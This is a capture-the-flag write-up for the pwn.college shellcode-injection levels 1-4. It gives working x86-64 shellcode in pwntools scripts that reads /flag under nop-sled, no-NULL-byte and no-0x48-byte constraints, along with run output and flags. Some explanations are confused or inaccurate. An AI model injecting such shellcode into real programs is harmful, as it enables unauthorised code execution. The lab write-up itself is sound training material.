# Shell Injection

---

## level1

### Challenge

```
Write and execute shellcode to read the flag!
```

### Solving

In this challenge we first read the c code file which has the context of what our challenge is going to be like:

```shell
hacker@shellcode-injection~level1:/challenge$ ./babyshell-level-1
###
### Welcome to ./babyshell-level-1!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

In this challenge, shellcode will be copied onto the stack and executed. Since the stack location is randomized on every
execution, your shellcode will need to be *position-independent*.

Allocated 0x1000 bytes for shellcode on the stack at 0x7ffdb6904940!
Reading 0x1000 bytes from stdin.

test
This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x00007ffdb6904940 | 74 65                                         | je 0x7ffdb69049a7
0x00007ffdb6904942 | 73 74                                         | jae 0x7ffdb69049b8

Executing shellcode!

Segmentation fault
hacker@shellcode-injection~level1:/challenge$ 
```
Now understanding this here is our goal:  
We need to inject shell code (our machine instructions) to be able to open a shell then read a file. 
Now some things we can understand before even trying to use this as shellcode are -> 

1. **Syscall essentially** -> (system call) allows the user to request services from the OS's kernel (bridge between software and hardware) for eg ``2`` is a ``openfile()`` command and ``0`` is a ``readfile()`` command
2. **Syscall registers** (accumalators) -> ``RAX`` Is used to hold the syscall numnber and stores the value if returned from syscalls. 
3. **Base Register** -> ``RBX`` Base register used to hold addresses and offsets **(RBX IS ALSO A GENERAL PURPOSE REGISTER)**
4. **Counter Registers** -> Used as a counter for looping instructions ``RCX``
5. **Syscall Arguments** -> ``rdi``, ``rsi``, ``rdx``, ``r10``, ``r8``, ``r9`` in orders of the 1st to the 6th argument that could be passed to a syscall. (rdi) = Register Destination Index, (rsi) = Register Source Index.

Now that we know all of this let's discuss the asm code they have given us ->

```asm
mov rbx, 0x00000067616c662f  # push "/flag" filename
push rbx

mov rax, 2                  # syscall number of open
mov rdi, rsp                # point the first argument at stack (where we have "/flag")
mov rsi, 0                  # NULL out the second argument (meaning, O_RDONLY)
syscall                     # trigger open("/flag", NULL)

mov rdi, 1                  # first argument to sendfile is the file descriptor to output to (stdout)
mov rsi, rax                # second argument is the file descriptor returned by open
mov rdx, 0                  # third argument is the number of bytes to skip from the input file
mov r10, 1000               # fourth argument is the number of bytes to transfer to the output file
mov rax, 40                 # syscall number of sendfile
syscall                     # trigger sendfile(1, fd, 0, 1000)

mov rax, 60                 # syscall number of exit
syscall                     # trigger exit()
```

- The first 2 instructions push the "/flag" onto the stack with hex representation but with little endian representation. Hence its reversed
- After that we setup a syscall for ``open`` (2) value in syscall we then have the first argument point to ``/flag`` and Null for read only mode the 2nd argument to which we then ``open("/flag")``
- We then change the first argument of sendfile to output, second argument is whatever was returned to ``RAX`` by the syscall for ``open`` We then skip the number of bytes of input to this file and then change the sycall number to ``sendfile`` This is then triggered
- We then just do syscall to exit and trigger it

Essentially we are just ->

Opening the file (done in read only mode) -> Sends the file contents (standard output of 1000 bytes and 0 offset) -> exit

Hence this does what is required so we can make a cool script out of this.


```python
from pwn import *

p = process("/challenge/babyshell-level-1")
context.arch = 'amd64'

shellcode = asm(f'''
mov rbx, 0x00000067616c662f  # push "/flag" filename
push rbx

mov rax, 2                  # syscall number of open
mov rdi, rsp                # point the first argument at stack (where we have "/flag")
mov rsi, 0                  # NULL out the second argument (meaning, O_RDONLY)
syscall                     # trigger open("/flag", NULL)

mov rdi, 1                  # first argument to sendfile is the file descriptor to output to (stdout)
mov rsi, rax                # second argument is the file descriptor returned by open
mov rdx, 0                  # third argument is the number of bytes to skip from the input file
mov r10, 1000               # fourth argument is the number of bytes to transfer to the output file
mov rax, 40                 # syscall number of sendfile
syscall                     # trigger sendfile(1, fd, 0, 1000)

mov rax, 60                 # syscall number of exit
syscall                     # trigger exit()
''')

p.sendline(shellcode)
p.interactive()
```

Hence running this we get our flag ->


```shell
hacker@shellcode-injection~level1:~$ python3 script.py
[+] Starting local process '/challenge/babyshell-level-1': pid 30477
[*] Switching to interactive mode
[*] Process '/challenge/babyshell-level-1' stopped with exit code 1 (pid 30477)
###
### Welcome to /challenge/babyshell-level-1!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

In this challenge, shellcode will be copied onto the stack and executed. Since the stack location is randomized on every
execution, your shellcode will need to be *position-independent*.

Allocated 0x1000 bytes for shellcode on the stack at 0x7ffee1223510!
Reading 0x1000 bytes from stdin.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x00007ffee1223510 | 48 bb 2f 66 6c 61 67 00 00 00                 | movabs rbx, 0x67616c662f
0x00007ffee122351a | 53                                            | push rbx
0x00007ffee122351b | 48 c7 c0 02 00 00 00                          | mov rax, 2
0x00007ffee1223522 | 48 89 e7                                      | mov rdi, rsp
0x00007ffee1223525 | 48 c7 c6 00 00 00 00                          | mov rsi, 0
0x00007ffee122352c | 0f 05                                         | syscall 
0x00007ffee122352e | 48 c7 c7 01 00 00 00                          | mov rdi, 1
0x00007ffee1223535 | 48 89 c6                                      | mov rsi, rax
0x00007ffee1223538 | 48 c7 c2 00 00 00 00                          | mov rdx, 0
0x00007ffee122353f | 49 c7 c2 e8 03 00 00                          | mov r10, 0x3e8
0x00007ffee1223546 | 48 c7 c0 28 00 00 00                          | mov rax, 0x28
0x00007ffee122354d | 0f 05                                         | syscall 
0x00007ffee122354f | 48 c7 c0 3c 00 00 00                          | mov rax, 0x3c
0x00007ffee1223556 | 0f 05                                         | syscall 

Executing shellcode!

pwn.college{gg4KfsW9aAftVBp1WBhWlKL-yso.01NxIDL4czN0czW}
[*] Got EOF while reading in interactive
```

### Flag

> pwn.college{gg4KfsW9aAftVBp1WBhWlKL-yso.01NxIDL4czN0czW}

---

## level2

### Challenge

```
Write and execute shellcode to read the flag, but a portion of your input is randomly skipped.
```

### Solving

Let's first run the challenge see what it says 

```shell
hacker@shellcode-injection~level2:/challenge$ ./babyshell-level-2
###
### Welcome to ./babyshell-level-2!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

In this challenge, shellcode will be copied onto the stack and executed. Since the stack location is randomized on every
execution, your shellcode will need to be *position-independent*.

Allocated 0x1000 bytes for shellcode on the stack at 0x7ffe750a6390!
Reading 0x1000 bytes from stdin.

t
Executing filter...

This challenge will randomly skip up to 0x800 bytes in your shellcode. You better adapt to that! One way to evade this
is to have your shellcode start with a long set of single-byte instructions that do nothing, such as `nop`, before the
actual functionality of your code begins. When control flow hits any of these instructions, they will all harmlessly
execute and then your real shellcode will run. This concept is called a `nop sled`.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x00007ffe750a69a6 | 00 00                                         | add byte ptr [rax], al
0x00007ffe750a69a8 | 90                                            | nop 
0x00007ffe750a69a9 | 00 00                                         | add byte ptr [rax], al
0x00007ffe750a69ab | 00 00                                         | add byte ptr [rax], al
0x00007ffe750a69ad | 00 00                                         | add byte ptr [rax], al
0x00007ffe750a69af | 00 08                                         | add byte ptr [rax], cl
0x00007ffe750a69b1 | 00 00                                         | add byte ptr [rax], al
0x00007ffe750a69b3 | 00 00                                         | add byte ptr [rax], al
0x00007ffe750a69b5 | 00 00                                         | add byte ptr [rax], al
0x00007ffe750a69b7 | 00 53 e5                                      | add byte ptr [rbx - 0x1b], dl
0x00007ffe750a69ba | 74 64                                         | je 0x7ffe750a6a20
0x00007ffe750a69bc | 04 00                                         | add al, 0
0x00007ffe750a69be | 00 00                                         | add byte ptr [rax], al
0x00007ffe750a69c0 | 50                                            | push rax
0x00007ffe750a69c1 | 03 00                                         | add eax, dword ptr [rax]
0x00007ffe750a69c3 | 00 00                                         | add byte ptr [rax], al
0x00007ffe750a69c5 | 00 00                                         | add byte ptr [rax], al
0x00007ffe750a69c7 | 00 50 03                                      | add byte ptr [rax + 3], dl
0x00007ffe750a69ca | 00 00                                         | add byte ptr [rax], al
0x00007ffe750a69cc | 00 00                                         | add byte ptr [rax], al
0x00007ffe750a69ce | 00 00                                         | add byte ptr [rax], al
0x00007ffe750a69d0 | 50                                            | push rax
0x00007ffe750a69d1 | 03 00                                         | add eax, dword ptr [rax]
0x00007ffe750a69d3 | 00 00                                         | add byte ptr [rax], al
0x00007ffe750a69d5 | 00 00                                         | add byte ptr [rax], al
0x00007ffe750a69d7 | 00 20                                         | add byte ptr [rax], ah
0x00007ffe750a69d9 | 00 00                                         | add byte ptr [rax], al
0x00007ffe750a69db | 00 00                                         | add byte ptr [rax], al
0x00007ffe750a69dd | 00 00                                         | add byte ptr [rax], al
0x00007ffe750a69df | 00 20                                         | add byte ptr [rax], ah
0x00007ffe750a69e1 | 00 00                                         | add byte ptr [rax], al
0x00007ffe750a69e3 | 00 00                                         | add byte ptr [rax], al
0x00007ffe750a69e5 | 00 00                                         | add byte ptr [rax], al
0x00007ffe750a69e7 | 00 08                                         | add byte ptr [rax], cl
0x00007ffe750a69e9 | 00 00                                         | add byte ptr [rax], al
0x00007ffe750a69eb | 00 00                                         | add byte ptr [rax], al
0x00007ffe750a69ed | 00 00                                         | add byte ptr [rax], al
0x00007ffe750a69ef | 00 50 e5                                      | add byte ptr [rax - 0x1b], dl
0x00007ffe750a69f2 | 74 64                                         | je 0x7ffe750a6a58
0x00007ffe750a69f4 | 04 00                                         | add al, 0
0x00007ffe750a69f6 | 00 00                                         | add byte ptr [rax], al
0x00007ffe750a69f8 | bc e6 1b 00 00                                | mov esp, 0x1be6
0x00007ffe750a69fd | 00 00                                         | add byte ptr [rax], al
0x00007ffe750a69ff | 00 bc e6 1b 00 00 00                          | add byte ptr [rsi + riz*8 + 0x1b], bh
0x00007ffe750a6a06 | 00 00                                         | add byte ptr [rax], al
0x00007ffe750a6a08 | bc e6 1b 00 00                                | mov esp, 0x1be6
0x00007ffe750a6a0d | 00 00                                         | add byte ptr [rax], al
0x00007ffe750a6a0f | 00 d4                                         | add ah, dl
0x00007ffe750a6a11 | 5e                                            | pop rsi
0x00007ffe750a6a12 | 00 00                                         | add byte ptr [rax], al
0x00007ffe750a6a14 | 00 00                                         | add byte ptr [rax], al
0x00007ffe750a6a16 | 00 00                                         | add byte ptr [rax], al

Executing shellcode!

Segmentation fault
hacker@shellcode-injection~level2:/challenge$ 
```

From here we understand that it is skipp 800 bytes of our shellcode before actually executing it luckily they seem to have given us a hint to just ``nop`` before the actual functionality of the code. Now we can just send 800 lines of this :D
Nop is generally used to align code as it does nothing.

```python
from pwn import *

p = process("/challenge/babyshell-level-2")
context.arch = 'amd64'

shellcode = asm(f'''
mov rbx, 0x00000067616c662f  # push "/flag" filename
push rbx

mov rax, 2                  # syscall number of open
mov rdi, rsp                # point the first argument at stack (where we have "/flag")
mov rsi, 0                  # NULL out the second argument (meaning, O_RDONLY)
syscall                     # trigger open("/flag", NULL)

mov rdi, 1                  # first argument to sendfile is the file descriptor to output to (stdout)
mov rsi, rax                # second argument is the file descriptor returned by open
mov rdx, 0                  # third argument is the number of bytes to skip from the input file
mov r10, 1000               # fourth argument is the number of bytes to transfer to the output file
mov rax, 40                 # syscall number of sendfile
syscall                     # trigger sendfile(1, fd, 0, 1000)

mov rax, 60                 # syscall number of exit
syscall                     # trigger exit()
''')

buffer = asm("nop") * 800

p.sendline(buffer + shellcode)
p.interactive()
```

Running this returns us the file: (had to run it a couple of times hmmmm)

```shell
hacker@shellcode-injection~level2:~$ python3 script.py 
[+] Starting local process '/challenge/babyshell-level-2': pid 894
[*] Switching to interactive mode
###
### Welcome to /challenge/babyshell-level-2!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

In this challenge, shellcode will be copied onto the stack and executed. Since the stack location is randomized on every
execution, your shellcode will need to be *position-independent*.

Allocated 0x1000 bytes for shellcode on the stack at 0x7ffdfa3d1090!
Reading 0x1000 bytes from stdin.

Executing filter...

This challenge will randomly skip up to 0x800 bytes in your shellcode. You better adapt to that! One way to evade this
is to have your shellcode start with a long set of single-byte instructions that do nothing, such as `nop`, before the
actual functionality of your code begins. When control flow hits any of these instructions, they will all harmlessly
execute and then your real shellcode will run. This concept is called a `nop sled`.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x00007ffdfa3d1216 | 90                                            | nop 
0x00007ffdfa3d1217 | 90                                            | nop 
0x00007ffdfa3d1218 | 90                                            | nop 
0x00007ffdfa3d1219 | 90                                            | nop 
0x00007ffdfa3d121a | 90                                            | nop 
0x00007ffdfa3d121b | 90                                            | nop 
0x00007ffdfa3d121c | 90                                            | nop 
0x00007ffdfa3d121d | 90                                            | nop 
0x00007ffdfa3d121e | 90                                            | nop 
0x00007ffdfa3d121f | 90                                            | nop 
0x00007ffdfa3d1220 | 48 bb 2f 66 6c 61 67 00 00 00                 | movabs rbx, 0x67616c662f
0x00007ffdfa3d122a | 53                                            | push rbx
0x00007ffdfa3d122b | 48 c7 c0 02 00 00 00                          | mov rax, 2
0x00007ffdfa3d1232 | 48 89 e7                                      | mov rdi, rsp
0x00007ffdfa3d1235 | 48 c7 c6 00 00 00 00                          | mov rsi, 0
0x00007ffdfa3d123c | 0f 05                                         | syscall 
0x00007ffdfa3d123e | 48 c7 c7 01 00 00 00                          | mov rdi, 1
0x00007ffdfa3d1245 | 48 89 c6                                      | mov rsi, rax
0x00007ffdfa3d1248 | 48 c7 c2 00 00 00 00                          | mov rdx, 0
0x00007ffdfa3d124f | 49 c7 c2 e8 03 00 00                          | mov r10, 0x3e8
0x00007ffdfa3d1256 | 48 c7 c0 28 00 00 00                          | mov rax, 0x28
0x00007ffdfa3d125d | 0f 05                                         | syscall 
0x00007ffdfa3d125f | 48 c7 c0 3c 00 00 00                          | mov rax, 0x3c
0x00007ffdfa3d1266 | 0f 05                                  [*] Process '/challenge/babyshell-level-2' stopped with exit code 1 (pid 894)
       | syscall 

Executing shellcode!

pwn.college{gqfbZixmEcLpVzXdW1B270mn2zk.0FOxIDL4czN0czW}
[*] Got EOF while reading in interactive
$  
```

### Flag

> pwn.college{gqfbZixmEcLpVzXdW1B270mn2zk.0FOxIDL4czN0czW}


---

## level3

### Challenge

```
Write and execute shellcode to read the flag, but your inputted data is filtered before execution.
```


### Solving

Test running the file we see that it is withinfact santizing arguments ;-;

```shell
hacker@shellcode-injection~level3:/challenge$ ./babyshell-level-3
###
### Welcome to ./babyshell-level-3!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x22920000!
Reading 0x1000 bytes from stdin.

t
Executing filter...

This challenge requires that your shellcode have no NULL bytes!

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x0000000022920000 | 74 0a                                         | je 0x2292000c

Executing shellcode!

Segmentation fault
hacker@shellcode-injection~level3:/challenge$ 
```

we see a glaring line ``This challenge requires that your shellcode have no NULL bytes!`` hence this means our asm code should not contain any null bytes D:

hence cool script I made:

```python
from pwn import *

p = process("/challenge/babyshell-level-3")
context.arch = 'amd64'

shellcode = asm(f'''

mov rbx, 0x101010101010101
push rbx
mov rbx, 0x101010101010101 ^ 0x00000067616c662f
xor [rsp], rbx

xor rax, rax
mov al, 2
xor rsi, rsi
mov rdi, rsp
syscall

xor rdi, rdi
mov dil, 1
mov rsi, rax
xor rdx, rdx 
mov al, 40               
mov r10b, 230
syscall                  

xor rax, rax
mov al, 60
syscall
''')


p.sendline(shellcode)
p.interactive()
```

The first part of our code is altering our flag format. Loads the big pattern hex string into rbx which is then pushed onto the stack. The XOR operation with this will flip certain bits between these two values, resulting in a new value that contains the address /flag (modified as needed for the context). The result of this XOR operation is stored back in rbx. The next instruction performs an XOR operation between the value at the memory address pointed to by rsp (the stack) and the value in rbx. The value at [rsp] is 0x101010101010101, which was the value pushed earlier. The rbx register now contains the XORed result (probably something like 0x67616c662f), which is ``/flag``, hence 0 null bytes :D.


Now the next part essentially xors rax byitself causing it to become 0. We then Move 2 into the lower 8 bytes of al causing no null bytes to occur. This is because the other 56 bytes remain unchanged hence not nullified. We then do the same for rsi which is one of our arguments.
We then move the current value in rsp to rdi to which it does a system call for open with our payload of ``/flag``. 

In the next set we first make rdi 0 with our xoring operations. We then store 1 in ``dil`` which is the lower part of our rdi register hence not causing nullification for other parts. We then get the returned value of ``rax`` and put it int rsi. We then make rdx 0 before setting the argument for number of stuff to print which we set as 230 in the lower 8 bits of rdx before making the syscall.


Finally we just exit :D

```shell
hacker@shellcode-injection~level3:~$ python3 script.py
[+] Starting local process '/challenge/babyshell-level-3': pid 2617
[*] Switching to interactive mode
###
### Welcome to /challenge/babyshell-level-3!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x22920000!
Reading 0x1000 bytes from stdin.

Executing filter...

This challenge requires that your shellcode have no NULL bytes!

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x0000000022920000 | 48 bb 01 01 01 01 01 01 01 01                 | movabs rbx, 0x101010101010101
0x000000002292000a | 53                                            | push rbx
0x000000002292000b | 48 bb 2e 67 6d 60 66 01 01 01                 | movabs rbx, 0x1010166606d672e
0x0000000022920015 | 48 31 1c 24                                   | xor qword ptr [rsp], rbx
0x0000000022920019 | 48 31 c0                                      | xor rax, rax
0x000000002292001c | b0 02                                         | mov al, 2
0x000000002292001e | 48 31 f6                                      | xor rsi, rsi
0x0000000022920021 | 48 89 e7                                      | mov rdi, rsp
0x0000000022920024 | 0f 05                                         | syscall 
0x0000000022920026 | 48 31 ff                                      | xor rdi, rdi
0x0000000022920029 | 40 b7 01                                      | mov dil, 1
0x000000002292002c | 48 89 c6                                      | mov rsi, rax
0x000000002292002f | 48 31 d2                                      | xor rdx, rdx
0x0000000022920032 | b0 28                                         | mov al, 0x28
0x0000000022920034 | 41 b2 e6                                      | mov r10b, 0xe6
0x0000000022920037 | 0f 05                                         | syscall 
0x0000000022920039 | 48 31 c0                                      | xor rax, rax
0x000000002292003c | b0 3c                                         | mov al, 0x3c
0x000000002292003e | 0f 05                                         | syscall 

Executing shellcode!

pwn.college{UiWTsMYhvLN_BFxzmNufd0WZv_e.0VOxIDL4czN0czW}
[*] Process '/challenge/babyshell-level-3' stopped with exit code 1 (pid 2617)
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
```

**P.S** important note I am not sure why this script is not working albeit it does pass by no null bytes test case and upon doing an strace we see the syscall is being called correctly but lack of permissions After trying to look for solns on discord I can find none.

trying to run this through strace we see the payload is correct 

![WhatsApp Image 2025-01-07 at 01 48 23_8a0da48f](https://github.com/user-attachments/assets/ccb2b258-320b-453c-ac89-0107caba7649)

But what I think is the fact that some of the rax, rdi values will have dumps hence why before using them we need to wipe them setting them to 0 before setitng the lower bytes

```python
from pwn import *

p = process("/challenge/babyshell-level-3")
context.arch = 'amd64'

shellcode = asm(f'''
mov rbx, 0x101010101010101
push rbx
mov rbx, 0x101010101010101 ^ 0x00000067616c662f
xor [rsp], rbx

mov al, 2
xor rsi, rsi
mov rdi, rsp
syscall

mov dil, 1
mov rsi, rax            
xor rdx, rdx                  
mov r10b, 232           
mov al, 40               
syscall                     

xor rax, rax
mov al, 60
xor rdi, rdi
mov dil, 1
syscall
''')


p.sendline(shellcode)
p.interactive()
```

### Flag

> pwn.college{UiWTsMYhvLN_BFxzmNufd0WZv_e.0VOxIDL4czN0czW}

---

## level4

### Challenge

### Solving

running this with some test input t

```shell
hacker@shellcode-injection~level4:/challenge$ ./babyshell-level-4
###
### Welcome to ./babyshell-level-4!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x22817000!
Reading 0x1000 bytes from stdin.

t
Executing filter...

This challenge requires that your shellcode have no H bytes!

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x0000000022817000 | 74 0a                                         | je 0x2281700c

Executing shellcode!

Segmentation fault
hacker@shellcode-injection~level4:/challenge$ 
```
We come to the realisation that we are not allowed to use H bytes. These are essentially 0x48 opcodes. Now because we cant use these bytes we cannot pass the entire flag in one go. As such what an easier thing we can do is reference the memory location of the string``/flag`` that we enter allowing us to use it without the hassle of having it to store it properly, hence we can just reference this path normally through asm.

Now as we can't use 64 bit registers we can use the 32 bit -> 8 bit registers

```python
from pwn import *

p = process("/challenge/babyshell-level-4")
context.arch = 'amd64'

shellcode = asm('''
xor esi, esi
xor edx, edx
lea edi, [eip + location]
xor eax, eax
mov al, 2
syscall

mov edi, eax
xor eax, eax
mov al, 0
push rsp
pop rsi
mov dl, 230
syscall

mov edx, eax
mov dil, 1
mov al, 1
syscall


xor edi, edi
mov al, 60
syscall

location:
  .string "/flag"
''')

p.sendline(shellcode)
p.interactive()
```

The first set make esi and edx zero. We then load the address of the string ``/flag``, It loads it into the eid register After that it wipes eax and moves 2 into the lowest 8 bytes of it. before using the syscal which opens the file.


The second set then copies the value returned from the syscall into edi. We then clear the eax register before loading it with a new syscall for read. We ten push the current rsp onto the stack. We then pop the top value in the stack and place it into rsi essentially holding /flag
After that we set the flag for the space then syscall reading the data.

Lastly we then store whatever was read by the previous syscall We then write the number of bytes that where read from the previous syscall.

hence we exit the programme.

```shell
from pwn import *

p = process("/challenge/babyshell-level-4")
context.arch = 'amd64'

shellcode = asm('''
xor esi, esi
xor edx, edx
lea edi, [eip + location]
xor eax, eax
mov al, 2
syscall

mov edi, eax
xor eax, eax
mov al, 0
push rsp
pop rsi
mov dl, 128
syscall

mov edx, eax
mov dil, 1
mov al, 1
syscall


xor edi, edi
mov al, 60
syscall

location:
  .string "/flag"
''')

p.sendline(shellcode)
p.interactive()
```


### Flag

> pwn.college{IMHcVubFF-vOK5JptNvvA7ogm1H.0FMyIDL4czN0czW}

---
